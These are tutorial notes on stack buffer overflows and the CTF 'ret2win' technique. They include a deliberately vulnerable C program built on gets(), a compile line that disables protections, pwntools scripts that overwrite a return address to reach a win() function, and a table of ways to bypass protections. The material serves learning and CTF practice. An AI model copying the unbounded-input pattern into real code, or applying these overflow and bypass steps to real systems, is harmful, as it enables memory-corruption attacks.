
# 📚 Stack Overflow & ret2win& ret functions — Full Exploit Notes

---

## 🧠 What Is a Stack Overflow?

A **stack overflow** occurs when data written to a **stack buffer** exceeds its allocated size and **overwrites adjacent memory** — especially the **saved return address**.

This lets an attacker **redirect execution** to arbitrary code or functions.

---

## 🧨 What Is ret2win?

**ret2win** (short for "return to win") is a **beginner-level exploit** where the attacker:

- **Overflows** a buffer on the stack
    
- **Overwrites** the saved return address
    
- **Redirects execution** to a function like `win()` that prints a flag or spawns a shell
    

> No shellcode needed — just return to an existing function.

---

## 📁 Sample Vulnerable C Program

c



`#include <stdio.h> #include <string.h> #include <stdlib.h>  void win() {     system("cat flag.txt");  // Attacker's goal }  void vuln() {     char buffer[64];         // Stack buffer     printf("Enter your input: ");     gets(buffer);            // ❌ Vulnerable: no bounds check }  int main() {     vuln();     return 0; }`

### 🔥 Vulnerabilities:

- Uses `gets()` → allows **unbounded input**
    
- `win()` is never called by default
    
- Return address can be overwritten to jump to `win()`
    

---

## 🔍 Stack Layout (After vuln is called)

kotlin



`[ buffer (64 bytes)         ] [ saved EBP (4 or 8 bytes)  ] [ return address (4 or 8)   ]  ◄──── overwrite this!`

To hijack control flow:

ini



`payload = [ 'A' * 64 ] + [ 'B' * 8 ] + [ win() address ]`

---

## 🧪 ret2win Exploitation – Step-by-Step

### ✅ 1. Compile with No Protections (Linux)

bash



`gcc -fno-stack-protector -z execstack -no-pie -o vuln vuln.c`

### ✅ 2. Find Address of `win()`

bash



`objdump -d vuln | grep win`

Example:

php-template



`080491e2 <win>:`

(Use this address in the payload)

---

### ✅ 3. Build the Exploit Payload

- 64 bytes to fill buffer
    
- 4–8 bytes for saved EBP
    
- Address of `win()` (in little-endian)
    

python



`from pwn import *  win = p32(0x080491e2)        # Replace with actual win address payload = b"A"*64 + b"B"*4 + win  p = process("./vuln") p.sendline(payload) p.interactive()`

---

### 🧠 ret2win Summary Table

|Element|Description|
|---|---|
|Overflow Type|Stack-based buffer overflow|
|Target|Saved return address|
|Payload|Buffer filler + win() address|
|Protection Bypass|No need to disable NX|
|Complexity|Low – no shellcode needed|

---

## 🛡️ Protections That Can Break ret2win

|Protection|Blocks?|Bypass|
|---|---|---|
|**Stack Canary**|✅|Brute-force, info leak|
|**ASLR**|❌ for static binaries|Leak libc|
|**PIE**|✅|Leak binary base|
|**DEP/NX**|❌|Not needed here|
|**RELRO (Full)**|❌|No GOT overwrite used|

---

## 📜 Common ret2win CTF Pattern

### ✅ Provided:

- `win()` function
    
- Input via `gets()` or `fgets()`
    
- No PIE or stack canary
    

### 🔓 Goal:

- Find offset to return address
    
- Overwrite return address with `win()`'s address
    
- Get the flag!
    

---

## 🧪 ret2win GDB Debugging Tips

bash



`gdb ./vuln b vuln run`

Then use:

- `info frame` – view return address
    
- `x/20x $esp` – inspect stack
    
- `pattern_create` / `pattern_offset` – find overflow offset
    

---

## 📦 Bonus: Python Payload Generator

python



`from pwn import *  offset = 64 + 4               # Buffer + saved EBP win = p32(0x080491e2)         # Replace with correct address  payload = b"A" * offset + win  with open("payload", "wb") as f:     f.write(payload)`

---

## 🔚 Summary

|Concept|Details|
|---|---|
|Stack Overflow|Writes beyond buffer, into return addr|
|ret2win|Redirects execution to a known function|
|Why it works|Return address is overwritten|
|What you need|Address of `win()`, overflow offset|
|Fix|Use `fgets`, enable stack protector, PIE, etc.|
